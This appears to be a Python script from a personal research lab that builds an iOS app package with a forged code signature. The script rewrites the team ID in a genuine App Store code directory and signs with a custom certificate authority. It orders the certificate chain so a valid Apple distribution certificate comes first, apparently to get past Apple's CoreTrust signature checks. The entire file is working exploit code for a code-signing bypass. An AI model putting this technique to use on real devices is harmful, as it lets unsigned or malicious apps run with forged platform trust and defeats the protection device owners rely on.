#!/usr/bin/env python3
"""dist-first single-signer experiment:
- main CD: real App Store CD with team rewritten to our distribution team
- alternate CD: our SHA-256 CD
- CMS: one signer = our custom CA (valid now); certificate set deliberately
  ordered [distribution leaf, WWDR, Apple Root, custom CA] so the first cert
  is a currently-valid Apple-issued leaf.
"""
import os, sys, struct, hashlib, plistlib, zipfile, shutil
sys.path.insert(0, '/home/femboychik/asuka4scape/06_CORETRUST/ctlab/bypass')
import build_bypass as bb
from asn1crypto import cms, core
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding

HERE = '/home/femboychik/asuka4scape/06_CORETRUST/ctlab/bypass'
DIST_LEAF = open(os.path.join(HERE, 'dist_leaf.der'), 'rb').read()
WWDR = open(os.path.join(HERE, 'wwdr.der'), 'rb').read()
CA_KEY = serialization.load_pem_private_key(open('/tmp/ctdistfirst/CAKey_now.pem', 'rb').read(), password=None)
CA_CERT = open('/tmp/ctdistfirst/CACert_now.pem', 'rb').read()


def tlv(tag, body):
    return bytes([tag]) + bb.der_len(len(body)) + body


def load_template():
    der = open(os.path.join(HERE, 'AppStoreSignatureBlob.bin'), 'rb').read()[8:]
    ci = cms.ContentInfo.load(der)
    sd = ci['content']
    root = None
    for c in sd['certificates']:
        if c.name == 'certificate':
            cc = c.chosen
            if 'Apple Root CA' in cc.subject.human_friendly and root is None:
                root = cc.dump()
    return der, ci, sd, root


def ordered_cms(template_der, our_cd, appstore_cd, ca_key, ca_cert):
    _, tci, tsd, root = load_template()
    sha1_app = hashlib.sha1(appstore_cd).digest()
    sha256_our = hashlib.sha256(our_cd).digest()
    md = hashlib.sha256(appstore_cd).digest()
    xml = plistlib.dumps({'cdhashes': [sha1_app, sha256_our[:20]]}, fmt=plistlib.FMT_XML)
    der1 = bb.digest_info(bb.SHA1_OID, sha1_app)
    der2 = bb.digest_info(bb.SHA256_OID, sha256_our)
    attrs = cms.CMSAttributes([
        cms.CMSAttribute({'type': 'content_type', 'values': ['data']}),
        cms.CMSAttribute({'type': 'message_digest', 'values': [md]}),
        cms.CMSAttribute({'type': '1.2.840.113635.100.9.1', 'values': [core.OctetString(xml)]}),
        cms.CMSAttribute({'type': '1.2.840.113635.100.9.2',
                          'values': [core.Sequence.load(der1), core.Sequence.load(der2)]}),
    ])
    attrs = cms.CMSAttributes(sorted(list(attrs), key=lambda a: a.dump()))
    raw = attrs.dump()
    signed = b'\x31' + raw[1:] if raw[0] == 0xA0 else raw
    sig = ca_key.sign(signed, padding.PKCS1v15(), hashes.SHA256())
    from asn1crypto import x509 as ax509
    ca_crypt = x509.load_pem_x509_certificate(CA_CERT)
    ca_a = ax509.Certificate.load(ca_crypt.public_bytes(serialization.Encoding.DER))
    sid = cms.SignerIdentifier({'issuer_and_serial_number': cms.IssuerAndSerialNumber({
        'issuer': ca_a.issuer, 'serial_number': ca_a.serial_number})})
    signer = cms.SignerInfo({
        'version': 'v1', 'sid': sid,
        'digest_algorithm': {'algorithm': 'sha256', 'parameters': core.Null()},
        'signed_attrs': attrs,
        'signature_algorithm': {'algorithm': 'sha256_rsa', 'parameters': core.Null()},
        'signature': sig})
    # Deliberate order, not DER-sorted.
    certs = [DIST_LEAF, WWDR, root, ca_a.dump()]
    cert_body = b''.join(certs)
    cert_field = tlv(0xA0, cert_body)
    signer_der = signer.dump()
    signer_set = tlv(0x31, signer_der)
    sd_body = tsd['version'].dump() + tsd['digest_algorithms'].dump() + tsd['encap_content_info'].dump() + cert_field + signer_set
    sd_der = tlv(0x30, sd_body)
    ci_body = tci['content_type'].dump() + tlv(0xA0, sd_der)
    return tlv(0x30, ci_body)


def modified_appstore_cd():
    b = bytearray(open(os.path.join(HERE, 'AppStoreCodeDirectory.bin'), 'rb').read())
    team_off = struct.unpack_from('>I', b, 48)[0]
    assert b[team_off:team_off + 10] == b'T8ALTGMVXN', b[team_off:team_off + 10]
    b[team_off:team_off + 10] = b'8F9U9JSYJ9'
    return bytes(b)


def main():
    # swap in the modified App Store CD and the current-valid custom CA
    bb.add_single_signer = ordered_cms
    acd = modified_appstore_cd()
    orig_acd = open(os.path.join(HERE, 'AppStoreCodeDirectory.bin'), 'rb').read()
    orig_key = open(os.path.join(HERE, 'CAKey.pem'), 'rb').read()
    orig_cert = open(os.path.join(HERE, 'CACert.pem'), 'rb').read()
    try:
        open(os.path.join(HERE, 'AppStoreCodeDirectory.bin'), 'wb').write(acd)
        open(os.path.join(HERE, 'CAKey.pem'), 'wb').write(open('/tmp/ctdistfirst/CAKey_now.pem', 'rb').read())
        open(os.path.join(HERE, 'CACert.pem'), 'wb').write(CA_CERT)
        bundle = '/tmp/ctdistfirst/Payload/ctlab.app'
        bb.build(bundle, os.path.join(HERE, 'work/base_ctlab'),
                 os.path.join(HERE, 'work/CodeResources.template'),
                 '/tmp/ctdistfirst/ents.plist',
                 '/tmp/ctdistfirst/ctlab-distfirst.ipa',
                 team='8F9U9JSYJ9', single=True)
    finally:
        open(os.path.join(HERE, 'AppStoreCodeDirectory.bin'), 'wb').write(orig_acd)
        open(os.path.join(HERE, 'CAKey.pem'), 'wb').write(orig_key)
        open(os.path.join(HERE, 'CACert.pem'), 'wb').write(orig_cert)


if __name__ == '__main__':
    main()
